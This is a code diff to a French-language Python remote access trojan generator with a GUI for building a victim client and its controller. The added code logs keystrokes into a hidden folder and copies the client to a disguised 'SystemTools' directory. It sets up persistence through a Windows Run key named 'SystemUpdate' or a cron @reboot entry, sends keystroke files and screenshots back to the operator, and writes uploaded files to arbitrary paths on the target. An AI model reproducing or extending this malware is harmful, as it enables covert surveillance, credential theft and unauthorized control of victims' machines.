@@ -8,6 +8,7 @@ import time
 import tempfile
 import zipfile
 import threading
+import itertools
 
 def create_exe_with_nuitka(input_file: str, exe_name: str = None):
     """
@@ -224,18 +225,31 @@ import cv2
 import io
 import keyboard
 import pyautogui
-import winreg as reg
+if platform.system() == "Windows":
+    import winreg as reg
+else:
+    reg=None
 
 time_interval = 10
 text = ""
 
 # Configuration de l'environnement selon l'OS
-hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
+if platform.system() == "Windows":
+    hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
+else:
+    hidden_folder = os.path.join(os.path.expanduser('~/.config'), "SecretFolder", "keystrokes") 
 
 os.makedirs(hidden_folder, exist_ok=True)  # Creer le repertoire cache s'il n'existe pas
 
+def get_new_keystroke_file_path():
+    # Creer un nouveau nom de fichier avec un timestamp unique
+    timestamp = time.strftime("%Y%m%d-%H%M%S")  # Format : 20250101-103000
+    hidden = hidden_folder  # Remplacez ceci par le chemin reel du dossier cache
+    return os.path.join(hidden, f"keystrokes_{timestamp}.txt")
+
+
 # Fichier de touches
-keystroke_file_path = os.path.join(hidden_folder, "keystrokes.txt")
+keystroke_file_path = ""
 
 # Variable pour suivre l'etat de l'enregistrement
 is_recording = False
@@ -278,22 +292,44 @@ def record_keystrokes():
     global is_recording
     try:
         with open(keystroke_file_path, 'a') as data_file:
-            data_file.write(f"Started recording at {time.ctime()}")
+            data_file.write(f"Started recording at {time.ctime()}\\n")
             while is_recording:
-                # Enregistrer les touches en continu
-                events = keyboard.record('enter')  # Enregistrer jusqu'a "enter"
-                password = list(keyboard.get_typed_strings(events))
-                if password:
-                    data_file.write(password[0])  # Sauvegarder les touches dans le fichier
-                    data_file.write('')  # Ajouter une nouvelle ligne apres chaque entree
-                time.sleep(0.1)  # Petite pause pour ne pas surcharger la CPU
+                events = keyboard.record(until='enter')  # Enregistrer jusqu'a "enter"
+                typed_text = ""
+
+                for event in events:
+                    if event.event_type == 'down':  # Considerer uniquement les appuis
+                        if event.name == 'tab':
+                            typed_text += '[Tab]\t'  # Ajouter une representation lisible de Tab
+                        elif event.name == 'enter':
+                            typed_text += '[ENTER]'  # Remplacer Enter par un indicateur
+                        elif event.name == 'backspace':
+                            if typed_text:  # Verifier qu'il y a du texte a supprimer
+                                typed_text = typed_text[:-1] + '[BACKSPACE]'  # Supprimer et indiquer
+                        elif event.name == 'space':
+                            typed_text += '[SPACE]'  # Ajouter une representation pour Space
+                        elif len(event.name) == 1:  # Ajouter uniquement les caracteres valides
+                            typed_text += event.name
+                        else:
+                            continue  # Ignorer les autres touches comme Ctrl, Alt, etc.
+
+                # Filtrer les lignes inutiles
+                if not any(keyword in typed_text.lower() for keyword in ['haut']):
+                    if typed_text.strip():  # Verifier qu'il reste du contenu pertinent
+                        data_file.write(typed_text + '\\n')
+
+                time.sleep(0.1)  # Pause pour eviter de surcharger la CPU
     except Exception as e:
         print(f"Error while recording keystrokes: {str(e)}")
 
+
 # Fonction pour demarrer l'enregistrement
 def start_keylogger():
-    global is_recording
-    # Reinitialiser le fichier de frappes au debut
+    global is_recording, keystroke_file_path
+    # Reinitialiser le chemin du fichier de frappes avec un nouveau fichier unique
+    keystroke_file_path = get_new_keystroke_file_path()
+    
+    # Vider le fichier de frappes au debut
     try:
         with open(keystroke_file_path, 'w') as data_file:
             data_file.write("")  # Vider le contenu
@@ -303,10 +339,81 @@ def start_keylogger():
     is_recording = True
     threading.Thread(target=record_keystrokes, daemon=True).start()
 
+
 # Fonction pour arreter l'enregistrement
 def stop_keylogger():
     global is_recording
     is_recording = False  
+    
+def send_keystrokes_file():
+    try:
+        with open(keystroke_file_path, 'rb') as file:
+            file_data = file.read().hex()  # Convertir le fichier en hexadecimal pour l'envoyer   
+        sending({"status": "success", "data": file_data})
+    except Exception as e:
+        sending({"status": "error", "message": str(e)})    
+
+#la fonction qui vas duppliquer le client.exe dans un emplacemment sain pour eviter de supprimer par le vicitme
+
+def duplicate_client(client_path):
+    try:
+        if platform.system() == "Windows":
+            # Chemin discret sous AppData\Roaming
+            hidden_folder = os.path.join(os.getenv('APPDATA'), "SystemTools")
+        else:
+            # Chemin discret sous ~/.local/share
+            hidden_folder = os.path.join(os.path.expanduser("~/.local/share"), "SystemTools")
+
+        # Creer le dossier s'il n'existe pas
+        os.makedirs(hidden_folder, exist_ok=True)
+
+        # Chemin cible pour le fichier
+        target_path = os.path.join(hidden_folder, os.path.basename(client_path))
+        
+        # Copier le fichier s'il n'existe pas encore
+        if not os.path.exists(target_path):
+            with open(client_path, 'rb') as src, open(target_path, 'wb') as dst:
+                dst.write(src.read())
+            print(f"Client duplique dans : {target_path}")
+        else:
+            print(f"Le fichier existe deja dans : {target_path}")
+        return target_path
+    except Exception as e:
+        print(f"Erreur lors de la duplication du fichier : {e}")
+        return None
+
+#
+
+def add_persistence():
+    script_path = sys.argv[0]  # Chemin de l'executable en cours
+    try:
+        # Dupliquer le fichier dans un emplacement sur
+        duplicated_path = duplicate_client(script_path)
+
+        if platform.system() == "Windows":
+            # Ajouter au registre Windows
+            registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            app_name = "SystemUpdate"  # Nom visible dans le registre
+
+            if duplicated_path:
+                with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key_path, 0, reg.KEY_SET_VALUE) as reg_key:
+                    reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, f'"{duplicated_path}"')
+                return f"Persistance ajoutee pour : {duplicated_path}"
+            else:
+                return "Erreur lors de la duplication pour la persistance."
+        else:
+            # Ajouter une tache cron sous Linux
+            if duplicated_path:
+                cron_job = f"@reboot {duplicated_path}\\n"
+                cron_file_path = os.path.expanduser("~/.crontab")
+                with open(cron_file_path, "a") as cron_file:
+                    cron_file.write(cron_job)
+                return f"Persistance ajoutee pour : {duplicated_path} dans la crontab"
+            else:
+                return "Erreur lors de la duplication pour la persistance."
+
+    except Exception as e:
+        return f"Erreur lors de la configuration de la persistance : {str(e)}"
 
 # fonction pour le  keylooger
 def handle_keylogger_command(command):
@@ -322,38 +429,7 @@ def handle_keylogger_command(command):
     else:
         sending(f"Unknown keylogger command: {command}")
 
-def send_keystrokes_file():
-    try:
-        with open(keystroke_file_path, 'rb') as file:
-            file_data = file.read().hex()  # Convertir le fichier en hexadecimal pour l'envoyer   
-        sending({"status": "success", "data": file_data})
-    except Exception as e:
-        sending({"status": "error", "message": str(e)})    
 
-def add_persistence():
-    python_path = sys.executable  # Recuperer le chemin vers l'executable Python
-    script_path = os.path.abspath("your_script.py")  # Remplacer par le chemin de votre script
-
-    try:
-        if platform.system() == "Windows":
-            # Ouvrir la cle du registre HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
-            
-            # Ajouter l'entree pour le script Python
-            reg.SetValueEx(registry_key, "MyEmptyKey", 0, reg.REG_SZ, "")
-
-            # Fermer la cle du registre
-            reg.CloseKey(registry_key)
-        else:
-            # Ajouter une tache cron pour Linux
-            cron_job = f"@reboot {python_path} {script_path}"
-            with open(os.path.expanduser("~/.crontab"), "a") as cron_file:
-                cron_file.write(cron_job)
-
-        return "Persistance configuree avec succes ! Le script s'executera au demarrage."
-
-    except Exception as e:
-        return f"Erreur lors de la configuration de la persistance : {str(e)}"
 
 # fonction pour prendre une photo de la cible 
 def camera_handler():
@@ -411,30 +487,21 @@ def screenshot_handler():
 #fonction pour transmetre des fichiers 
 def upload_handler(command):
     try:
-        # Extraire le nom du fichier et les donnees
+        # Extraire le chemin cible et les donnees
         parts = command.split(" ", 2)
-        
         if len(parts) < 3:
             sending("Error: Invalid upload command format.")
-            return
-
-        filepath = parts[1]
-        filedata = parts[2]
-
-        # Recuperer le chemin du bureau de l'utilisateur
-        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-
-        # Nom de fichier seulement (sans le chemin d'origine)
-        filename = os.path.basename(filepath)
-
-        # Chemin complet du fichier sur le bureau
-        target_path = os.path.join(desktop_path, filename)
-
-        # ecrire les donnees dans le fichier
+            contin
+        target_path = parts[1]  # Chemin cible specifie par le serveur
+        filedata = parts[2]  # Donnees hexadecimales du fichi
+        # Assurez-vous que le repertoire cible existe
+        target_folder = os.path.dirname(target_path)
+        os.makedirs(target_folder, exist_ok=True)
+        # Ecrire les donnees dans le fichier cible
         with open(target_path, "wb") as f:
             f.write(bytes.fromhex(filedata))
-
-        sending(f"File {filename} uploaded successfully to Desktop.")
+        
+        sending(f"File uploaded successfully to {target_path}.")
     except Exception as e:
         sending(f"Error uploading file: {str(e)}")
 
@@ -531,7 +598,6 @@ def add_ip_and_port_to_victim_script(ip, port):
 def connection():
     global s
     while True:
-        time.sleep(20)
         try:
             s.connect((ip_address, port))
             shell()
@@ -693,74 +759,91 @@ def shell():
                 print(f"Current directory: {response}")
                 continue
             
-            #la commande pour puise fair une capture d'ecran sur la machine de ma vicitme
             elif command.strip() == "screenshot":
                 sending(command)
+            
+                # Reception de la reponse
                 response = receive()
-                if response.get("status") == "success":
-                    try:
-                        screenshot_data = response.get("data")
-                        if not screenshot_data:
-                            print("No screenshot data received.")
-                            continue
-                        # Chemin de sauvegarde
-                        screenshot_path = os.path.join(client_folder ,"screenshots", f"{ip}_ScreenShot.png")
-                        with open(screenshot_path, "wb") as f:
-                            f.write(bytes.fromhex(screenshot_data))
-                        print(f"Screenshot saved successfully at {screenshot_path}.")
-                    except Exception as e:
-                        print(f"Error saving screenshot: {str(e)}")
+            
+                # Verifier si response est un dictionnaire
+                if isinstance(response, dict):  # Si receive() retourne un dictionnaire
+                    # Verifier si la capture d'ecran a reussi
+                    if response.get("status") == "success":
+                        try:
+                            screenshot_data = response.get("data")
+                            if not screenshot_data:
+                                print("No screenshot data received.")
+                                continue
+            
+                            # Chemin de sauvegarde
+                            timestamp = time.strftime("%Y%m%d-%H%M%S")  # Ex : 20250101-103000
+                            screenshot_path = os.path.join(client_folder, "screenshots", f"{timestamp}_ScreenShot.png")
+            
+                            # Sauvegarder l'image
+                            with open(screenshot_path, "wb") as f:
+                                f.write(bytes.fromhex(screenshot_data))
+                            print(f"Screenshot saved successfully at {screenshot_path}.")
+                        except Exception as e:
+                            print(f"Error saving screenshot: {str(e)}")
+                    else:
+                        print(f"Error taking screenshot: {response.get('message')}")
                 else:
-                    print(f"Error taking screenshot: {response.get('message')}")
+                    print("Error: Received response is not a dictionary.")
                 continue
 
             
-            #la commande pour puisse telecharger des fichier ou des dossier depuis la machine de la vicitme
             elif command.startswith("download "):
+                # Verifier si un chemin ou un fichier a ete specifie apres "download "
+                if len(command.strip()) <= len("download "):
+                    print("Error: Please specify a file or directory to download.")
+                    continue
+            
+                # Envoyer la commande
                 sending(command)
                 response = receive()
-
-                # Chemin de stockage
-
-                if response.get("status") == "success":
+            
+                # Verifier la reponse
+                if isinstance(response, dict) and response.get("status") == "success":
                     # Extraire le nom du fichier demande
                     filename = os.path.basename(command[9:].strip())
-                    filepath = os.path.join(client_folder,"downloads", filename)
-
-                # Sauvegarder le fichier directement dans le repertoire Downloads
-                    with open(filepath, "wb") as f:
-                        f.write(bytes.fromhex(response["data"]))
-        
-                    print(f"File downloaded successfully: {filepath}")
+                    filepath = os.path.join(client_folder, "downloads", filename)
+            
+                    # Sauvegarder le fichier dans le repertoire Downloads
+                    try:
+                        with open(filepath, "wb") as f:
+                            f.write(bytes.fromhex(response["data"]))
+                        print(f"File downloaded successfully: {filepath}")
+                    except Exception as e:
+                        print(f"Error saving file: {str(e)}")
                 else:
-                    print(f"Error downloading file: {response.get('message')}")
+                    # Si la reponse contient un message d'erreur
+                    error_message = response.get("message") if isinstance(response, dict) else "Unknown error"
+                    print(f"Error downloading file: {error_message}")
                 continue
             
-           #la commande pour puise uploader des fichier dans la machine de vicitime 
+            #la commande pour puise uploader des fichier dans la machine de vicitime 
             elif command.startswith("upload "):
                 try:
-                # Recuperer le chemin specifie par l'utilisateur
-                    filepath = command.split(" ", 1)[1]
-        
-                # Ajouter le repertoire courant s'il s'agit d'un chemin relatif
-                    if not os.path.isabs(filepath):
-                        filepath = os.path.join(reper, filepath)
-                    else: 
-                        filepath = filename
-                # Debug : Afficher le chemin reel utilise
-                    print(f"Attempting to upload file from: {filepath}")
-        
-                # Verifier si le fichier existe
-                    if not os.path.exists(filepath):
-                        print(f"File '{filepath}' does not exist.")
+                    # Recuperer le chemin source (local au serveur) et le chemin cible (destination sur le client)
+                    parts = command.split(" ", 2)
+                    if len(parts) < 3:
+                        print("Usage: upload <local_file_path> <remote_target_path>")
                         continue
-        
-        # Lire le fichier
-                    with open(filepath, "rb") as f:
+
+                    local_path = parts[1]  # Chemin du fichier sur le serveur
+                    remote_target = parts[2]  # Chemin cible sur le client
+
+                    # Verifier si le fichier source existe
+                    if not os.path.exists(local_path):
+                        print(f"File '{local_path}' does not exist.")
+                        continue
+
+                    # Lire et convertir les donnees du fichier
+                    with open(local_path, "rb") as f:
                         filedata = f.read().hex()
-        
-                    # Envoyer au client
-                    sending(f"upload {filepath} {filedata}")
+
+                    # Envoyer la commande au client
+                    sending(f"upload {remote_target} {filedata}")
                     response = receive()
                     print(response)
                 except Exception as e:
@@ -799,15 +882,34 @@ def shell():
                 continue
             
             elif command.strip() == "keylogger stop":
+                # Envoyer la commande pour arreter l'enregistrement
                 sending(command)
+            
+                # Attendre la reponse
                 response = receive()
-                if response.get("status") == "success":
-                    keystrokes_path = os.path.join(client_folder, "keylogger", "keystrokes.txt")
-                    with open(keystrokes_path, "wb") as f:
-                        f.write(bytes.fromhex(response["data"]))
-                    print(f"Keystrokes file saved at: {keystrokes_path}")
+            
+                # Verifier si la reponse est deja un dictionnaire
+                if isinstance(response, dict):
+                    if response.get("status"):
+                        # Verifier si la reponse est reussie
+                        if response.get("status") == "success":
+                            # Recuperer le chemin du fichier et creer un nom unique pour le fichier de frappes
+                            timestamp = time.strftime("%Y%m%d-%H%M%S")  # Format : 20250101-103000
+                            keystrokes_path = os.path.join(client_folder, "keylogger", f"keystrokes_{timestamp}.txt")
+            
+                            # Sauvegarder le fichier de frappes recu dans le dossier approprie
+                            try:
+                                with open(keystrokes_path, "wb") as f:
+                                    f.write(bytes.fromhex(response["data"]))  # Convertir les donnees hexadecimales en bytes et les ecrire
+                                print(f"Keystrokes file saved at: {keystrokes_path}")
+                            except Exception as e:
+                                print(f"Error saving keystrokes file: {str(e)}")
+                        else:
+                            print(f"Failed to receive keystrokes file: {response.get('message')}")
+                    else:
+                        print("Response does not contain a 'status' field.")
                 else:
-                    print(f"Failed to receive keystrokes file: {response.get('message')}")
+                    print("Received response is not a dictionary. Please check the `receive()` function.")
             
             # Code cote serveur pour envoyer la commande persistance
             elif command.strip() == "persistance":
@@ -847,6 +949,15 @@ if __name__ == "__main__":
         file.write(f"    ip_address = \"{ip}\"")
         file.write(code_to_add)
 
+
+class Controller:
+    def destroy_page(self, page_name):
+        # Vérifie si la page existe dans le dictionnaire
+        if page_name in self.pages:
+            page = self.pages[page_name]
+            page.destroy()  # Détruit la page de l'interface graphique
+            del self.pages[page_name]  # Supprime la page du dictionnaire
+
 #handel
 def handle_button_click(self):
         # Appeler la methode save_and_next
@@ -877,7 +988,7 @@ class Application(ctk.CTk):
     def __init__(self):
         super().__init__()
         self.title("Genérateur de RAT - Interface Professionnelle")
-        self.geometry("600x600")  # Taille augmentée pour plus d'espace visuel
+        self.geometry("650x650")  # Taille augmentée pour plus d'espace visuel
         self.resizable(False, False)  # Empêche le redimensionnement pour préserver le design
         self.user_choices = {
             "options": [],
@@ -886,7 +997,7 @@ class Application(ctk.CTk):
             "output_path": None,
             "ip_address": "127.0.0.1",
             "port": 8080,
-            "encryption_method": "AES"
+            "ip_address2": "127.0.0.1",
         }
 
         # Configuration principale pour que tout le contenu s'étende
@@ -899,7 +1010,7 @@ class Application(ctk.CTk):
 
         # Initialisation des pages
         self.pages = {}
-        for Page in (IntroductionPage, OptionsPage, FileSelectionPage, NetworkSettingsPage, OutputPage):
+        for Page in (IntroductionPage, OptionsPage, FileSelectionPage, NetworkSettingsPage, OutputPage , WaitingPage):
             page_name = Page.__name__
             page = Page(parent=self.container, controller=self)
             self.pages[page_name] = page
@@ -956,7 +1067,6 @@ class OptionsPage(CenteredFrame):
             "Récupération des fichiers": "Télécharge les fichiers spécifiques depuis la cible.",
             "Transmettre des fichiers": "Permet d'envoyer des fichiers vers la cible.",
             "Persistance": "Implémente la persistance pour maintenir l'accès.",
-            "Surveillance du microphone": "Écoute via le microphone.",
             
         }
 
@@ -1091,8 +1201,7 @@ class FileSelectionPage(CenteredFrame):
                                        font=("Arial", 16), text_color="gray")
         self.file_label.pack(pady=10)
 
-        # Menu déroulant et bouton pour sélectionner un fichier
-        ctk.CTkLabel(self.inner_frame, text="Choisir l'extension :", font=("Arial", 14)).pack(pady=10)
+        
         
 
         ctk.CTkButton(self.inner_frame, text="Choisir un fichier", font=("Arial", 16),
@@ -1129,7 +1238,7 @@ class NetworkSettingsPage(CenteredFrame):
                      font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)
 
         # Adresse IP
-        ctk.CTkLabel(self.inner_frame, text="Adresse IP :", font=("Arial", 14)).pack(pady=5)
+        ctk.CTkLabel(self.inner_frame, text="Adresse IP(local : si l'attaque est dans le meme lan , public : si t'utilse un cloud)", font=("Arial", 14)).pack(pady=5)
         self.ip_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="127.0.0.1")
         self.ip_entry.insert(0, self.controller.user_choices["ip_address"])
         self.ip_entry.pack(pady=5)
@@ -1140,7 +1249,11 @@ class NetworkSettingsPage(CenteredFrame):
         self.port_entry.insert(0, str(self.controller.user_choices["port"]))
         self.port_entry.pack(pady=5)
 
-       
+       # Adresse IP
+        ctk.CTkLabel(self.inner_frame, text="Adresse IP local :", font=("Arial", 14)).pack(pady=5)
+        self.ip2_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="127.0.0.1")
+        self.ip2_entry.insert(0, self.controller.user_choices["ip_address2"])
+        self.ip2_entry.pack(pady=5)
        
         # Boutons de navigation
         button_frame = ctk.CTkFrame(self.inner_frame)
@@ -1157,6 +1270,7 @@ class NetworkSettingsPage(CenteredFrame):
 
     def save_and_next(self):
         self.controller.user_choices["ip_address"] = self.ip_entry.get()
+        self.controller.user_choices["ip_address2"] = self.ip2_entry.get()
         self.controller.user_choices["port"] = int(self.port_entry.get())
         self.controller.show_page("OptionsPage")
         
@@ -1164,32 +1278,61 @@ class NetworkSettingsPage(CenteredFrame):
     def recup_ip_port(controller_user_choices):
         ip_address = controller_user_choices.get("ip_address")
         port = controller_user_choices.get("port")
-        
         if ip_address and port:
             add_ip_and_port_to_victim_script(ip_address, port)
         else:
             print("IP ou Port non définis.")
         
+
     @staticmethod
     def recup_ip_port2(controller_user_choices):
-        ip_address = controller_user_choices.get("ip_address")
         port = controller_user_choices.get("port")
-        
-        if ip_address and port:
-            create_server_2(ip_address, port)
+        ip_address2 = controller_user_choices.get("ip_address2")
+        if ip_address2 and port:
+            create_server_2(ip_address2, port)
         else:
             print("IP ou Port non définis.")
 
 
-class WaitingPage(ctk.CTkToplevel):
-    def __init__(self, parent, message="Veuillez patienter..."):
+class WaitingPage(CenteredFrame):
+    def __init__(self, parent, controller):
         super().__init__(parent)
-        self.geometry("300x100")
-        self.title("En attente")
-        self.resizable(False, False)
-        self.label = ctk.CTkLabel(self, text=message, font=("Arial", 16))
+        self.controller = controller
+
+        # Label principal
+        self.label = ctk.CTkLabel(self.inner_frame, text="Veuillez patienter...",
+                                  font=("Arial", 24, "bold"), text_color="lightblue")
         self.label.pack(pady=20)
-        self.protocol("WM_DELETE_WINDOW", lambda: None)  # Désactiver la fermeture
+
+        # Label pour l'animation des points
+        self.animation_label = ctk.CTkLabel(self.inner_frame, text="",
+                                            font=("Arial", 50), text_color="gray")
+        self.animation_label.pack(pady=10)
+
+        # Démarrer l'animation
+        self.running = True
+        self.animation_thread = threading.Thread(target=self.animate_points, daemon=True)
+        self.animation_thread.start()
+
+    def animate_points(self):
+        """Animation de points (...)"""
+        dots = itertools.cycle(["", ".", "..", "..."])
+        while self.running:
+            self.animation_label.configure(text=next(dots))
+            self.animation_label.update()
+            self.animation_label.after(500)  # Ajuster la vitesse (500 ms)
+
+    def stop_animation(self):
+        """Arrête l'animation."""
+        self.running = False
+
+    def on_show(self):
+        """Reprendre l'animation quand la page est affichée."""
+        self.running = True
+        if not self.animation_thread.is_alive():
+            self.animation_thread = threading.Thread(target=self.animate_points, daemon=True)
+            self.animation_thread.start()
+        
 
 class OutputPage(CenteredFrame):
     def __init__(self, parent, controller):
@@ -1248,20 +1391,21 @@ class OutputPage(CenteredFrame):
         output_path = self.controller.user_choices["output_path"]
         ip_address = self.controller.user_choices["ip_address"]
         port = self.controller.user_choices["port"]
-        encryption_method = self.controller.user_choices["encryption_method"]
 
         messagebox.showinfo(
             "Succès",
             f"RAT généré avec succès !\n\nOptions : {options}\nExtension : {extension}\n"
             f"Fichier injecté : {file_to_inject}\nIP : {ip_address}\nPort : {port}\n"
-            f"Méthode de chiffrement : {encryption_method}\nStocké dans : {output_path}"
+            f"Stocké dans : {output_path}"
         )
 
+   
+
     def save_and_next(self):
-        # Crée et affiche une fenêtre d'attente
-        waiting_window = WaitingPage(self, message="Génération en cours, veuillez patienter...")
-        
-        # Fonction exécutée dans un thread
+        # Passer à la page WaitingPage
+        self.controller.show_page("WaitingPage")
+
+        # Lancer la tâche en arrière-plan
         def background_task():
             try:
                 current_dir = os.path.dirname(__file__)
@@ -1285,14 +1429,10 @@ class OutputPage(CenteredFrame):
             except Exception as main_error:
                 print(f"Error: {main_error}")
                 messagebox.showerror("Erreur", f"Une erreur s'est produite : {main_error}")
-            
-            finally:
-                waiting_window.destroy()  # Fermer la fenêtre d'attente
 
         # Lancer le thread
         thread = threading.Thread(target=background_task)
         thread.start()
-
 
 if __name__ == "__main__":
     app = Application()
